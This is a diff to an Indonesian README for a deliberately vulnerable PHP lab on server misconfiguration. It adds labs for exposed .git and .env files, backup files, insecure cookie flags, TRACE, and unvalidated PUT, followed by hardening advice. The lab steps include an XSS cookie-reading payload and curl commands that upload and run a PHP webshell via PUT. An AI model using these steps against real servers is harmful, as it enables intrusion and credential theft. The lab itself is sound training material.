@@ -12,6 +12,14 @@ bukan bug di kode aplikasi, melainkan pengaturan server/aplikasi yang tidak aman
 | 4 | Endpoint debug yang terlupakan | `lab4_debug_endpoint.php` |
 | 5 | CORS misconfiguration | `lab5_cors_misconfig.php` |
 | 6 | Header keamanan hilang &rarr; Clickjacking | `lab6_missing_headers_clickjacking.php` |
+| 7 | Folder .git ter-expose | `lab7_git_exposed.php` |
+| 8 | File .env ter-expose | `lab8_env_exposed.php` |
+| 9 | Backup file editor yang bisa ditebak | `lab9_backup_file_guess.php` |
+| 10 | Cookie tanpa flag HttpOnly | `lab10_missing_httponly.php` |
+| 11 | Cookie tanpa flag Secure | `lab11_missing_secure.php` |
+| 12 | Cookie tanpa atribut SameSite | `lab12_missing_samesite.php` |
+| 13 | HTTP method TRACE aktif (XST) | `lab13_trace_method.php` |
+| 14 | HTTP method PUT diterima tanpa validasi | `lab14_put_method.php` |
 
 ## Menjalankan
 
@@ -60,6 +68,52 @@ browser di origin lain.
 "Klaim Hadiah", lalu kembali ke halaman transfer dan lihat entri baru muncul di log transfer
 tanpa pernah benar-benar bermaksud menekan tombol transfer.
 
+### Lab 7 — Folder .git ter-expose
+Buka `vcs-demo/`, lalu akses `vcs-demo/.git/HEAD` dan `vcs-demo/.git/config` langsung — keduanya
+kebaca. Karena directory listing aktif juga di folder ini, seluruh isi `.git/` bisa diunduh lewat
+`wget -r` lalu dibaca riwayatnya dengan `git log --all -p` — termasuk file `config-secret.txt`
+yang sudah "dihapus" di commit terakhir tapi isinya tetap utuh di history.
+
+### Lab 8 — File .env ter-expose
+Akses `/secmisconfig/.env` langsung. File berisi kredensial database production, application
+key, dan password SMTP dalam bentuk plaintext.
+
+### Lab 9 — Backup file editor yang bisa ditebak
+Akses `/secmisconfig/config.php.save` langsung (tidak ada di directory listing manapun — murni
+tebakan nama file umum). Karena ekstensinya bukan `.php`, isinya dikirim sebagai teks biasa,
+membocorkan source code lengkap dengan kredensial database yang di-hardcode.
+
+### Lab 10 — Cookie tanpa flag HttpOnly
+Buka lab ini untuk dapat cookie `demo_session_httponly_off`. Lalu buka
+`lab10_missing_httponly.php?msg=<script>document.title=document.cookie</script>` — judul tab
+berubah menampilkan isi cookie tersebut, dibaca langsung lewat `document.cookie`.
+
+### Lab 11 — Cookie tanpa flag Secure
+Buka lab untuk dapat cookie `demo_session_secure_off`, lalu klik "Akses endpoint legacy" —
+cookie yang sama terkirim ke endpoint "plain HTTP" simulasi tanpa hambatan, membuktikan tidak
+ada jaminan cookie ini hanya melintas lewat koneksi terenkripsi.
+
+### Lab 12 — Cookie tanpa atribut SameSite
+Bandingkan header `Set-Cookie` di lab ini (`curl -i .../lab12_missing_samesite.php`) dengan lab
+10/11 — atribut `SameSite` tidak ada sama sekali, berbeda dari cookie lain yang eksplisit
+`SameSite=Lax`.
+
+### Lab 13 — HTTP method TRACE aktif (XST)
+```bash
+curl -v -X TRACE http://localhost:8079/secmisconfig/lab13_trace_method.php \
+  -H "X-Rahasia-Demo: nilai-ini-seharusnya-tidak-terlihat-siapa-pun"
+```
+Body response meng-echo balik seluruh header request, termasuk header custom yang dikirim.
+
+### Lab 14 — HTTP method PUT diterima tanpa validasi
+```bash
+printf '<?php system($_GET["cmd"]); ?>' > shell.php
+curl -X PUT --data-binary @shell.php "http://localhost:8079/secmisconfig/lab14_put_method.php?file=shell.php"
+curl "http://localhost:8079/secmisconfig/data/put_uploads/shell.php?cmd=id"
+```
+File yang di-`PUT` langsung tersimpan ke direktori yang tetap dieksekusi PHP oleh Apache —
+webshell berjalan tanpa pernah menyentuh form upload aplikasi.
+
 ## Mitigasi (untuk didiskusikan setelah lab)
 - Matikan mode debug (`APP_DEBUG=false` atau setara) di production; tampilkan pesan error
   generik ke user, dan catat detail lengkap hanya ke log server yang tidak publik.
@@ -77,3 +131,15 @@ tanpa pernah benar-benar bermaksud menekan tombol transfer.
   `SAMEORIGIN` bila memang perlu framing internal) dan
   `Content-Security-Policy: frame-ancestors 'self'` untuk mencegah clickjacking, ditambah
   header lain seperti `X-Content-Type-Options: nosniff`.
+- Jangan pernah men-deploy `.git`/`.svn` ke webroot production; kalaupun terjadi, blokir akses
+  ke seluruh dotfile/dotdir secara eksplisit di konfigurasi web server
+  (`<FilesMatch "^\."> Require all denied </FilesMatch>` atau setara).
+- Simpan `.env`/file konfigurasi sensitif di luar docroot, atau minimal blokir aksesnya lewat
+  aturan web server yang eksplisit.
+- Hapus file backup/recovery editor dari server production, dan pertimbangkan memblokir pola
+  ekstensi umum (`.bak`, `.save`, `.old`, `~`) lewat konfigurasi web server.
+- Pasang flag `HttpOnly`, `Secure`, dan `SameSite=Strict`/`Lax` secara eksplisit di setiap cookie
+  sesi/autentikasi — jangan bergantung pada default browser yang bisa berubah.
+- Matikan `TRACE` (`TraceEnable Off`) dan batasi method HTTP yang diterima tiap endpoint
+  (`<LimitExcept GET POST>...</LimitExcept>` atau setara) — jangan biarkan handler aplikasi
+  menerima method yang tidak pernah dimaksudkan untuk didukung.
